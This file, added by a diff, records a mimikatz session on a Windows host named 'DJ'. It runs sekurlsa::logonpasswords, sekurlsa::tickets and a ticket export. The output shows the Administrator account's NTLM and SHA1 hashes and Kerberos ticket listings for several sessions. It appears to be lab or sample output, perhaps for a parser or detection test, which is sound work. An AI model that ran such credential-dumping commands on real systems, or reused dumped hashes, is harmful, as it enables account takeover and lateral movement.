@@ -1,0 +1,388 @@
+Using 'blah.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 356777 (00000000:000571a9)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/7/2023 11:51:50 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 6ff0e850285bca4d438247a627b28201
+	 * SHA1     : e5e39c7d0cd1359b6f7badacc0555f07be86d9e4
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * NTLM     : 6ff0e850285bca4d438247a627b28201
+	 * SHA1     : e5e39c7d0cd1359b6f7badacc0555f07be86d9e4
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 289487 (00000000:00046acf)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/6/2022 5:33:38 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 6ff0e850285bca4d438247a627b28201
+	 * SHA1     : e5e39c7d0cd1359b6f7badacc0555f07be86d9e4
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * NTLM     : 6ff0e850285bca4d438247a627b28201
+	 * SHA1     : e5e39c7d0cd1359b6f7badacc0555f07be86d9e4
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 52042 (00000000:0000cb4a)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:53 PM
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DJ$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 52024 (00000000:0000cb38)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:53 PM
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DJ$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:50 PM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DJ$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 483096 (00000000:00075f18)
+Session           : Service from 0
+User Name         : Classic .NET AppPool
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 4/8/2023 12:34:53 AM
+SID               : S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DJ$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/6/2022 5:00:35 PM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:55 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 32625 (00000000:00007f71)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:38 PM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:37 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DJ$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # sekurlsa::tickets
+
+Authentication Id : 0 ; 356777 (00000000:000571a9)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/7/2023 11:51:50 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 289487 (00000000:00046acf)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/6/2022 5:33:38 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:50 PM
+SID               : S-1-5-20
+
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:55 PM
+SID               : S-1-5-19
+
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:37 PM
+SID               : S-1-5-18
+
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 356777 (00000000:000571a9)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/7/2023 11:51:50 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 289487 (00000000:00046acf)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : DJ
+Logon Server      : DJ
+Logon Time        : 4/6/2022 5:33:38 PM
+SID               : S-1-5-21-1593768313-1968616076-3839711322-500
+
+	 * Username : Administrator
+	 * Domain   : DJ
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:50 PM
+SID               : S-1-5-20
+
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:55 PM
+SID               : S-1-5-19
+
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DJ$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 4/6/2022 4:59:37 PM
+SID               : S-1-5-18
+
+	 * Username : dj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+mimikatz # exit
+Bye!
